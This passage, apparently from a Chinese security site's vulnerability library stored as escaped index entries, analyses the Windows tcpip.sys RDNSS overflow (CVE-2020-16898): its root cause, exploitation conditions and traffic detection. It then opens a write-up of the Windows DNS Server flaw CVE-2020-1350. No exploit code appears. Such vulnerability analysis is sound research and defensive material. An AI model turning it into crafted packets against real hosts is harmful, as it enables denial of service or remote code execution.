<p>\u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a</p> <p></p> <p>\u6b64\u65f6\u518d\u6b21\u786e\u8ba4\u63a5\u53e3\u7684RDNSS\u5f00\u542f\u60c5\u51b5\uff0cRDNSS\u529f\u80fd\u5df2\u88ab\u5173\u95ed\uff1a</p> <p></p> <p>\u4e8c\u3001\u6f0f\u6d1e\u590d\u73b0</p> <p>1. \u73af\u5883\u642d\u5efa</p> <p>l \u9776\u673a\uff1aWindows 10 1809 x64</p> <p>l \u9776\u673a\u64cd\u4f5c\uff1a\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c\uff0c\u53ef\u6b63\u5e38\u4e0e\u653b\u51fb\u673a\u901a\u4fe1\u5373\u53ef</p> <p>2. \u590d\u73b0\u8fc7\u7a0b</p> <p>\\1. \u901a\u8fc7\u5404\u79cd\u624b\u6bb5\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684IPv6\u5730\u5740\u548cMAC\u5730\u5740(\u5177\u4f53\u65b9\u6cd5\u53ef\u81ea\u884c\u63a2\u7d22\uff0c\u8f83\u4e3a\u7b80\u5355)</p> <p>\\2. \u653b\u51fb\u673apython3\u8fd0\u884cpoc\uff1a</p> <p></p> <p>\\3. \u9776\u673acrash\uff1a</p> <p></p> <p>\u4e09\u3001\u6f0f\u6d1e\u5206\u6790</p> <p>1. \u57fa\u672c\u4fe1\u606f</p> <ul> <li>\u6f0f\u6d1e\u6587\u4ef6\uff1atcpip.sys</li> <li>\u6f0f\u6d1e\u51fd\u6570\uff1aIpv6pUpdateRDNSS()\u51fd\u6570</li> <li>\u6f0f\u6d1e\u5bf9\u8c61\uff1aICMPv6\u8def\u7531\u5e7f\u64ad\u4e2d\u7684option\u7ed3\u6784</li> </ul> <p>2. \u80cc\u666f\u77e5\u8bc6</p> <p>\u9650\u4e8e\u7bc7\u5e45\u95ee\u9898\uff0c\u6b64\u5904\u4e0d\u5bf9\u7528\u4e8eDNS\u914d\u7f6e\u7684IPv6\u8def\u7531\u5e7f\u64ad\u8fdb\u884c\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u66f4\u8be6\u7ec6\u8d44\u6599\u53ef\u53c2\u8003RFC8106\u3002</p> <p>1. \u57fa\u672c\u77e5\u8bc6</p> <p>IPv6 Router Advertisment (RA) options\uff0c\u4e5f\u79f0\u4e3aDNS RA   options\uff0c\u5141\u8bb8IPv6\u7684\u8def\u7531\u5668\u5411IPv6\u7684\u4e3b\u673a\u5e7f\u64adDNS Recursive Server  Address(DNS\u9012\u5f52\u8def\u7531\u5668\u5730\u5740)\u5217\u8868\u548cDNS  Search  List(DNS\u641c\u7d22\u5217\u8868)\uff0c\u5176\u4e3b\u8981\u7528\u9014\u4e3a\u5728IPv6\u7684\u4e3b\u673a\u4e0a\u8fdb\u884cDNS\u540d\u79f0\u89e3\u6790\u4ee5\u53ca\u57df\u540e\u7f00\u7684\u5904\u7406\u3002</p> <p>IPv6 Neighbor Discovery(ND\uff0cIPv6\u90bb\u5c45\u53d1\u73b0)\u548cIPv6 Stateless Address   Autoconfiguratioin(SLAAC\uff0cIPv6\u65e0\u72b6\u6001\u5730\u5740\u81ea\u52a8\u914d\u7f6e)\u63d0\u4f9b\u4e86\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2aIPv6\u5730\u5740\uff0c\u9ed8\u8ba4\u8def\u7531\u5668\u4ee5\u53ca\u4e00\u4e9b\u5176\u4ed6\u53c2\u6570\u914d\u7f6e\u56fa\u5b9a\u8282\u70b9\u6216\u79fb\u52a8\u8282\u70b9\u7684\u65b9\u6cd5\u3002</p> <p>\u5f53\u6f2b\u6e38\u4e3b\u673a\u6bcf\u6b21\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u7f51\u7edc\u65f6\uff0c\u65e0\u6cd5\u8fdb\u884c\u624b\u52a8\u914d\u7f6e\u3002 \u867d\u7136\u53ef\u4ee5\u8fdb\u884c\u9759\u6001\u914d\u7f6e\uff0c\u4f46\u662f\u5728\u8bf8\u5982\u7b14\u8bb0\u672c\u7535\u8111\u4e4b\u7c7b\u7684\u901a\u7528\u4e3b\u673a\u4e0a\u901a\u5e38\u4e0d\u5efa\u8bae\u8fd9\u6837\u64cd\u4f5c\u3002   \u4f8b\u5982\uff0c\u5982\u679c\u4e3b\u673a\u8fd0\u884c\u76f4\u63a5\u8fde\u63a5\u5230\u5168\u5c40DNS\u7684\u81ea\u5df1\u7684\u9012\u5f52\u540d\u79f0\u670d\u52a1\u5668\uff0c\u90a3\u4e48\u672c\u5730\u5b9a\u4e49\u7684\u540d\u79f0\u7a7a\u95f4\u5bf9\u4e3b\u673a\u6765\u8bf4\u5c31\u4e0d\u53ef\u7528\u4e86\u3002  \u8bbf\u95eeDNS\u662f\u51e0\u4e4e\u6240\u6709\u4e3b\u673a\u7684\u57fa\u672c\u8981\u6c42\uff0c\u56e0\u6b64IPv6  SLAAC\u5728\u6ca1\u6709\u4efb\u4f55DNS\u914d\u7f6e\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u5728\u4efb\u4f55\u5b9e\u9645\u7684\u7f51\u7edc\u73af\u5883\u4e2d\u5355\u72ec\u4f5c\u4e3a\u66ff\u4ee3\u90e8\u7f72\u6a21\u578b\u3002</p> <p>\u5bf9\u4e8eIPv4\u73af\u5883\u4e2d\u7684DNS\u670d\u52a1\u5668\u6765\u8bf4\uff0c\u8fd9\u4e9b\u95ee\u9898\u90fd\u5f88\u5bb9\u6613\u89e3\u51b3\u3002\u4f46\u662f\u5bf9\u4e8eIPv6\u7684\u7f51\u7edc\u73af\u5883\uff0c\u8fd9\u4e9b\u95ee\u9898\u663e\u5f97\u6bd4\u8f83\u68d8\u624b\u3002\u56e0\u6b64\uff0cRFC8106\u5b9a\u4e49\u4e86\u4e00\u79cd\u57fa\u4e8eDNS  RA\u9009\u9879\u7684\u673a\u5236\uff0c\u4ee5\u5141\u8bb8IPv6\u4e3b\u673a\u6267\u884c\u81ea\u52a8DNS\u914d\u7f6e\u3002</p> <p>\u5728\u901a\u8fc7IPv6   SLAAC\u81ea\u52a8\u914d\u7f6eIPv6\u4e3b\u673a\u5730\u5740\u5e76\u4e14\u6ca1\u6709DHCPv6\u57fa\u7840\u7ed3\u6784\u6216\u4e00\u4e9b\u4e3b\u673a\u6ca1\u6709DHCPv6\u5ba2\u6237\u7aef\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u4f5c\u4e3a\u66ff\u4ee3\u3002  \u4f46\u662f\uff0c\u5bf9\u4e8e\u9700\u8981\u5206\u53d1\u5176\u4ed6\u4fe1\u606f\u7684\u7f51\u7edc\uff0c\u53ef\u80fd\u4ecd\u7136\u4f1a\u4f7f\u7528DHCPv6\u3002 \u5728\u8fd9\u4e9b\u7f51\u7edc\u4e2d\uff0c\u53ef\u80fd\u4e0d\u9700\u8981\u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u3002   \u57fa\u4e8eRA\u7684DNS\u914d\u7f6e\u5141\u8bb8IPv6\u4e3b\u673a\u83b7\u53d6\u4e3b\u673a\u8fde\u63a5\u5230\u7684\u94fe\u63a5\u7684DNS\u914d\u7f6e(\u5373DNS\u9012\u5f52\u670d\u52a1\u5668\u5730\u5740\u548cDNSSL)\u3002   \u6b64\u5916\uff0c\u4e3b\u673a\u4f1a\u4ece\u63d0\u4f9b\u94fe\u63a5\u914d\u7f6e\u4fe1\u606f\u7684\u540c\u4e00RA\u6d88\u606f\u4e2d\u5b66\u4e60\u6b64DNS\u914d\u7f6e\u3002</p> <p>2. \u540d\u8bcd\u89e3\u91ca</p> <ul> <li>Recursive DNS Server  (RDNSS)\uff1a\u9012\u5f52DNS\u670d\u52a1\u5668\uff0c\u63d0\u4f9b\u9012\u5f52DNS\u89e3\u6790\u670d\u52a1\u7684\u670d\u52a1\u5668\uff0c\u7528\u4e8e\u5c06\u57df\u540d\u8f6c\u6362\u4e3aIP\u5730\u5740\u6216\u89e3\u6790\u6210RFC1034\u548cRFC1035\u4e2d\u5b9a\u4e49\u7684PTR\u8bb0\u5f55\u3002</li> <li>RDNSS Option\uff1a\u4e00\u4e2a\u7528\u4e8e\u5411IPv6\u4e3b\u673a\u4f20\u9001RDNSS\u4fe1\u606f\u7684IPv6\u7684RA option\u3010RFC4861\u3011\u3002</li> <li>DNS Search List (DNSSL)\uff1aPv6\u4e3b\u673a\u5728\u6267\u884cDNS\u67e5\u8be2\u641c\u7d22\u65f6\u4f7f\u7528\u7684DNS\u540e\u7f00\u57df\u540d\u5217\u8868\uff0c\u7528\u4e8e\u641c\u7d22\u7b80\u77ed\u7684\u4e0d\u5408\u683c\u57df\u540d\u3002</li> <li>DNSSL Option\uff1a\u4e00\u4e2aIPv6 RA\u9009\u9879\uff0c\u7528\u4e8e\u5c06DNSSL\u4fe1\u606f\u4f20\u9012\u5230IPv6\u4e3b\u673a\u3002</li> </ul> <p>3. \u8be6\u7ec6\u5206\u6790</p> <p>\\1. \u57fa\u7840\u5206\u6790</p> <p>RFC8106\u6807\u51c6\u5316\u4e86RDNSS option\uff0c\u5176\u4e2d\u5305\u542bRDNSSes\u7684\u5730\u5740\u3002\u8be5\u4fe1\u606f\u4f7f\u7528\u73b0\u6709ND  message(\u4f8b\u5982RA)\u4f5c\u4e3a\u8f7d\u4f53\u3002IPv6\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7RA\u6d88\u606f\u914d\u7f6e\u4e00\u4e2a\u6216\u591a\u4e2aRDNSS\u7684IPv6\u5730\u5740\u3002</p> <p>(1) \u90bb\u5c45\u53d1\u73b0\u6269\u5c55</p> <p>RFC8106\u4e2d\u5b9a\u4e49\u7684\u5728\u90bb\u5c45\u53d1\u73b0\u4e2d\u4f7f\u7528\u7684IPv6 DNS\u914d\u7f6e\u7b97\u6cd5\u9700\u8981\u7528\u52302\u79cdND options\uff1aRDNSS option\u548cDNSSL  option\u3002\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u662fRDNSS option\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u4e0e CVE-2020-16899\u76f8\u5173\u3002</p> <p>(2)RDNSS Option Structure</p> <p>RDNSS option\u603b\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>\u5bf9\u4e8eLength\u5b57\u6bb5\uff0c\u5982\u679c\u8be5\u9009\u9879\u4e2d\u4ec5\u5305\u542b\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u5219\u6700\u5c0f\u503c\u4e3a3\u3002  \u6bcf\u589e\u52a0\u4e00\u4e2aRDNSS\u5730\u5740\uff0c\u957f\u5ea6\u5c31\u4f1a\u589e\u52a02\u3002\u63a5\u6536\u7684\u4e3b\u673a\u4f7f\u7528\u8be5\u5b57\u6bb5\u6765\u786e\u5b9a\u9009\u9879\u4e2dIPv6\u5730\u5740\u7684\u6570\u91cf\u3002</p> <p>(3)Procedure in IPv6 Hosts</p> <p>\u5f53\u4e3b\u673a\u63a5\u6536\u5230RA\u6d88\u606f\u4e2d\u7684DNS\u7684options\u65f6\uff0c\u5176\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u9996\u5148\u68c0\u67e5Lengh\u5b57\u6bb5\u7684\u5408\u6cd5\u6027\uff1a\u662f\u5426\u5927\u4e8e\u7b49\u4e8e\u6700\u5c0f\u503c3\uff0c\u4ee5\u53ca\u662f\u5426\u6ee1\u8db3(Length - 1) % 2 == 0;</li> <li>\u5bf9\u4e8eRDNSS option\uff0c\u8fd8\u4f1a\u68c0\u67e5Address\u5b57\u6bb5\u662f\u5426\u4e3a\u4e00\u4e2a\u5355\u64ad\u5730\u5740;</li> <li>\u5982\u679c\u4ee5\u4e0a\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u4e3b\u673a\u5e94\u6309\u987a\u5e8f\u5c06\u9009\u9879\u7684\u503c\u590d\u5236\u5230DNS\u5b58\u50a8\u5e93\u548c\u89e3\u6790\u5668\u5b58\u50a8\u5e93\u4e2d\u3002 \u5426\u5219\uff0c\u4e3b\u673a\u5fc5\u987b\u4e22\u5f03\u8fd9\u4e9b\u9009\u9879\u3002</li> </ul> <p>(4)Crash\u5206\u6790</p> <p>\u9996\u5148\u5206\u6790dmp\u6587\u4ef6\uff0c\u67e5\u770bcrash\u73b0\u573a\uff1a</p> <p></p> <p></p> <p></p> <p>\u5e76\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u7684\u8f83\u4e3a\u6709\u4ef7\u503c\u7684Call Stack\u4fe1\u606f\uff0c\u4f46\u662f\u53d1\u73b0\u6700\u7ec8\u7684crash\u539f\u56e0\u7684\u662fGS\u673a\u5236\u7684Security   Cookie\u6821\u9a8c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u503c\u88ab\u8986\u76d6\u6389\u4e86\u3002\u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u4e2a\u6ea2\u51fa\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u53ea\u53d1\u73b0\u4e86tcpip!Ipv6pHandleRouterAdvertisement+0x1269\u51fd\u6570\uff0c\u518d\u5f80\u540e\u5c31\u76f4\u63a5\u62a5gsfailure\u4e86\u3002</p> <p>\\2. \u9759\u6001\u5206\u6790</p> <p>\u5206\u6790\u4f7f\u7528\u7684\u6587\u4ef6\u4e3aWindows 10 1809 x64\u7684tcpip.sys\u6587\u4ef6\uff0c\u7248\u672c\u4e3a10.0.17763.316\u3002</p> <p>(1)\u51fd\u6570\u8c03\u7528\u94fe</p> <p>\u6839\u636ecrash\u73b0\u573a\u4fe1\u606f\uff0c\u83b7\u53d6\u5230\u5173\u952e\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u9996\u5148\u786e\u8ba4\u8be5\u51fd\u6570\u5230\u6f0f\u6d1e\u51fd\u6570\u7684\u524d\u540e\u8c03\u7528\u94fe\u3002</p> <p>\u9996\u5148\u67e5\u770b\u5176\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a</p> <p></p> <p>\u5176\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u4e3aIcmpv6ReceiveDatagrams()\uff0c\u8ddf\u8fdb\uff0c\u5e76\u67e5\u770b\u4ea4\u53c9\u5f15\u7528\u5173\u7cfb\uff1a</p> <p></p> <p>\u6ca1\u6709\u518d\u53d1\u73b0\u663e\u5f0f\u7684\u51fd\u6570\u8c03\u7528\u3002\u8f6c\u800c\u5411tcpip!Ipv6pHandleRouterAdvertisement()\u7684\u4e0b\u5c42\u641c\u7d22\uff1a</p> <p></p> <p>\u53d1\u73b0\u6f0f\u6d1e\u51fd\u6570\u8c03\u7528\u3002\u81f3\u6b64\uff0c\u51fd\u6570\u8c03\u7528\u94fe\u53ef\u4ee5\u7b80\u5355\u6982\u62ec\u4e3a\uff1a</p> <pre><code>Icmpv6ReceiveDatagrams() -&gt; tcpip!Ipv6pHandleRouterAdvertisement() -&gt; Ipv6pUpdateRDNSS() \n</code></pre> <p>(2)\u6f0f\u6d1e\u51fd\u6570\u5206\u6790</p> <p>\u7ecf\u8fc7\u7b80\u5355\u5206\u6790\u53ef\u4ee5\u660e\u786e\uff0c\u8c03\u7528\u94fe\u7684\u9876\u5c42\u51fd\u6570Icmpv6ReceiveDatagrams()\u6ca1\u6709\u53d1\u73b0\u5b9e\u8d28\u6027\u7684\u4e0e\u8be5\u6f0f\u6d1e\u76f8\u5173\u7684\u5904\u7406\u4ee3\u7801\uff0c\u800c\u5728tcpip!Ipv6pHandleRouterAdvertisement()   \u51fd\u6570\u4e2d\u53d1\u73b0\u4e86\u5bf9\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u7684\u8c03\u7528\u3002\u6839\u636ecrash\u5206\u6790\uff0c\u6700\u540e\u62a5\u4e86gsfailure\uff0c\u800c\u4e14\u5173\u952e\u51fd\u6570\u4e3atcpip!Ipv6pHandleRouterAdvertisement()\uff0c\u5728\u8be5\u51fd\u6570\u7684\u8d77\u59cb\u4f4d\u7f6e\u786e\u5b9e\u53d1\u73b0\u4e86GS\u6821\u9a8c\uff1a</p> <p></p> <p>\u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u5728\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\u4e2d\u53d1\u751f\u4e86\u6ea2\u51fa\uff0c\u5bfc\u81f4\u4e86\u5176\u8c03\u7528\u51fd\u6570tcpip!Ipv6pHandleRouterAdvertisement()\u7684GS\u6821\u9a8c\u5931\u8d25\u3002</p> <p>\u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570Ipv6pUpdateRDNSS()\uff1a</p> <p></p> <p>\u9996\u5148\u83b7\u53d6\u5230RDNSS option\u7ed3\u6784\uff0c\u7136\u540e\u8bfb\u53d6Length\u5b57\u6bb5\u6765\u8ba1\u7b97Address\u5b57\u6bb5\u6709\u51e0\u4e2aAddress\u503c\u3002</p> <p></p> <p>\u786e\u8ba4\u6709\u591a\u5c11Address\u4e4b\u540e\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5bf9\u6bcf\u4e2aAddress\u8fdb\u884c\u5904\u7406\uff0c\u6700\u5173\u952e\u7684\u662f\u5206\u914d\u5408\u9002\u7684\u5185\u5b58\u3002\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5224\u65ad\uff0c\u5982\u679c\u4e0d\u662f\u5355\u64ad\u5730\u5740\uff0c\u76f4\u63a5\u5ffd\u7565\u3002</p> <p>\u5728\u8fdb\u884c\u5904\u7406\u65f6\uff0c\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1a\u5047\u8bbeLength\u7684\u957f\u5ea6\u4e3a4\uff0c\u90a3\u4e48\u8ba1\u7b97\u7ed3\u675f\u4e4b\u540e\uff0cAddressCount\u7684\u503c\u5e94\u8be5\u4e3a1\u3002\u6b64\u65f6\uff0c\u6309\u7167\u6b63\u5e38\u903b\u8f91\uff0cIpv6pUpdateRDNSS()\u51fd\u6570\u5e94\u8be5\u589e\u52a032\u5b57\u8282(4*8)\u7684\u7f13\u51b2\u533a\uff0c\u4f46\u662f\u540e\u7eed\u5728\u5206\u914d\u7f13\u51b2\u533a\u65f6\u53ea\u5206\u914d\u4e8624\u5b57\u8282\uff1asizeof(ND_OPTION_RDNSS)  + sizeof(IN6_ADDR) = 8 + 16 = 24\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u7f13\u51b2\u533a\u7684\u6ea2\u51fa\u3002</p> <p>\u6839\u636eRFC8106\u7684\u6807\u51c6\uff0cLength\u5b57\u6bb5\u7684\u503c\u5e94\u8be5\u6ee1\u8db3\u6700\u5c0f\u4e3a3\u7684\u5947\u6570\u7684\u60c5\u51b5\u3002\u5f53\u63d0\u4f9b\u4e00\u4e2a\u5076\u6570Length\u503c\u65f6\uff0cWindows   TCP/IP\u5806\u6808\u9519\u8bef\u5730\u5c06buffer\u524d\u8fdb\u4e868\u4e2a\u5b57\u8282\u3002\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u5806\u6808\u5728\u5185\u90e8\u4ee516\u5b57\u8282\u4e3a\u589e\u91cf\u8fdb\u884c\u8ba1\u6570\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u975eRFC\u517c\u5bb9\u957f\u5ea6\u503c\u7684\u5904\u7406\u4ee3\u7801\u3002\u8fd9\u79cd\u4e0d\u5339\u914d\u5bfc\u81f4\u5806\u6808\u5c06\u5f53\u524d\u9009\u9879\u7684\u6700\u540e8\u4e2a\u5b57\u8282\u89e3\u91ca\u4e3a\u7b2c\u4e8c\u4e2a\u9009\u9879\u7684\u5f00\u59cb\uff0c\u6700\u7ec8\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u6f5c\u5728\u7684RCE\u3002</p> <p>4. \u5229\u7528\u601d\u8def</p> <p>\\1. \u5229\u7528\u6761\u4ef6</p> <p>\u57fa\u672c\u6761\u4ef6</p> <ul> <li>attacker\u9700\u8981\u83b7\u53d6target\u7684IPv6\u548cMAC\u5730\u5740</li> </ul> <p>\u89e6\u53d1\u8fc7\u7a0b</p> <ul> <li>attacker\u9700\u8981\u642d\u914d\u5176\u4ed6\u5185\u5b58\u6cc4\u6f0f\u6216\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u6765\u5b9e\u73b0RCE</li> <li>attacker\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7tcpip.sys\u7684GS\u4fdd\u62a4\u673a\u5236</li> </ul> <p>\\2. \u5229\u7528\u8fc7\u7a0b</p> <p>attacker\u76f4\u63a5\u53d1\u9001\u7279\u5236\u7684ICMPv6\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u7ed9target\uff1a</p> <p>[ Attacker ]</p> <p>\\3. \u653b\u51fb\u5411\u91cf</p> <p>\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u5229\u7528IPv6\u76f4\u63a5\u53d1\u9001\u653b\u51fb\u6570\u636e\u5305\u5373\u53ef\u3002</p> <p>5. \u6d41\u91cf\u5206\u6790</p> <p>\u56e0\u4e3a\u8be5\u6f0f\u6d1e\u76f4\u63a5\u8d70\u7684IPv6\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4e00\u4e9b\u90e8\u7f72\u5728IP\u5c42\u4ee5\u4e0a\u7684\u9632\u706b\u5899\u65b9\u6848\u5c31\u65e0\u6cd5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u6d41\u91cf\u68c0\u6d4b\uff0c\u4f46\u662f\u5177\u5907IP\u5c42\u6d41\u91cf\u68c0\u6d4b\u7684\u9632\u706b\u5899\u53ef\u4ee5\u8f7b\u677e\u68c0\u6d4b\u6076\u610f\u6d41\u91cf\uff1a</p> <p></p> <p>\u5728\u6d41\u91cf\u4e2d\u53ef\u4ee5\u660e\u663e\u770b\u51fa\uff0c\u7b2c\u4e00\u4e2aOption\u7ed3\u6784\u7684Address\u5b57\u6bb5\u9519\u8bef\u8bc6\u522b\u8ba1\u7b97\u4e86\u4e00\u4e2aRecursive DNS Server\u7684\u503c\uff1a</p> <p></p> <p>\u7b2c1\u4e2aRecursive DNS Server\u7684\u5730\u5740\u4e3a0018-0027\uff0c\u540e\u7eed\u76848\u4e2a\u5b57\u8282\u4e0d\u5e94\u8be5\u518d\u8fdb\u884c\u8bc6\u522b\u3002\u9009\u4e2d\u7b2c2\u4e2aRecursive DNS  Server\u65f6\u60c5\u51b5\u5982\u4e0b\uff1a</p> <p></p> <p>\u7b2c2\u4e2aRecursive DNS Server\u7684\u5730\u5740\u4e3a0028-0037\u3002\u4f46\u662f\u8be516\u4e2a\u5b57\u8282\u4e2d\u7684\u540e8\u4e2a\u5b57\u8282\u5f88\u660e\u663e\u4e3a\u4e0b\u4e00\u4e2aICMPv6  Option\u7ed3\u6784\u7684\u5185\u5bb9\uff1a</p> <p></p> <p>\u56db\u3001\u53c2\u8003\u6587\u732e</p> <ul> <li>https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898</li> <li>https://tools.ietf.org/html/rfc8106</li> <li>https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/","title":"Windows DNS  Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE 2020 1350","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/#0x00","title":"0x00 \u6f0f\u6d1e\u80cc\u666f","text":"<p>Windows DNS  Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-1350\uff09\uff1a\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5411\u76ee\u6807DNS\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u6570\u636e\u5305\u4ece\u800c\u76ee\u6807\u7cfb\u7edf\u4e0a\u4ee5\u672c\u5730SYSTEM\u8d26\u6237\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u8be5\u6f0f\u6d1e\u65e0\u9700\u4ea4\u4e92\u3001\u4e0d\u9700\u8981\u8eab\u4efd\u8ba4\u8bc1\u4e14Windows DNS Server\u9ed8\u8ba4\u914d\u7f6e\u53ef\u89e6\u53d1\uff0c\u653b\u51fb\u573a\u666f\u5982\u4e0b:</p> <p></p> <p>\uff08\u6ce8\uff1a\u56fe\u6765\u81ea\u4e92\u8054\u7f51\uff09</p> <p>\u5229\u7528\u573a\u666f1\uff1a</p> <p>\uff081\uff09\u53d7\u5bb3\u8005\u8bbf\u95ee\u653b\u51fb\u8005\u57df\u540d\"evil.server.io\"</p> <p>\uff082\uff09\u672c\u5730DNS\u670d\u52a1\u5668\u6216\u57df\u5185\u7684DNS\u670d\u52a1\u5668\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\uff0c\u5411google DNS\u670d\u52a1\u5668\uff08\u59828.8.8.8\uff09\u67e5\u8be2</p> <p>\uff083\uff09\u67e5\u5230\u540e\uff0c\u53d1\u73b0\u8be5\u57df\u540d\u53ef\u4ee5\u7531\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u89e3\u6790\uff0c\u6240\u4ee5\u5c06\u8be5\u4fe1\u606f\u7f13\u5b58\u5230\u57df\u670d\u52a1\u5668\u4e0a</p> <p>\uff084\uff09\u7b2c\u4e8c\u6b21\u67e5\u8be2\u65f6\uff0c\u76f4\u63a5\u548c\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2</p> <p>\uff085\uff09\u6b64\u65f6\u653b\u51fb\u8005\u670d\u52a1\u5668\u5c31\u53ef\u4ee5\u6784\u9020\u54cd\u5e94\u5305\u89e6\u53d1\u6f0f\u6d1e</p> <p>\u5728\u590d\u73b0\u8fc7\u7a0b\u4e2d\uff0c\u7b14\u8005\u7701\u7565\u4e86\uff081\uff09\u3001\uff082\uff09\u3001\uff083\uff09\u6b65\uff0c\u76f4\u63a5\u5728\u672c\u5730DNS\u670d\u52a1\u5668\u4e0a\u5c06\u653b\u51fb\u8005\u670d\u52a1\u5668\u5730\u5740\u8bbe\u4e3a\u8f6c\u53d1\u5668\uff0c\u5728\u672c\u5730\u65e0\u6cd5\u89e3\u6790\"evil.server.io\"\u65f6\uff0c\u8f6c\u800c\u5411\u653b\u51fb\u8005DNS\u670d\u52a1\u5668\u8fdb\u884c\u67e5\u8be2\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20DNS%20%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1350/#0x01","title":"0x01 \u6f0f\u6d1e\u5206\u6790","text":"<p>DNS\u5305\u683c\u5f0f\uff1a</p> <p>[\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-gpFNO5D3-1595035305870)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)]</p> <p>UDP\uff1a\u8868\u793aDNS\u67e5\u8be2\u57fa\u4e8eUDP\u534f\u8bae\u4f20\u8f93\u6570\u636e\u3002DNS\u670d\u52a1\u5668\u652f\u6301TCP\u548cUDP\u4e24\u79cd\u534f\u8bae\u7684\u67e5\u8be2\u65b9\u5f0f\u3002</p> <p>Destination port\uff1a\u76ee\u7684\u7aef\u53e3\u9ed8\u8ba4\u662f53\u3002</p> <p>QR\uff1a0\u8868\u793a\u67e5\u8be2\u62a5\u6587\uff1b1\u8868\u793a\u56de\u5e94\u62a5\u6587\u3002</p> 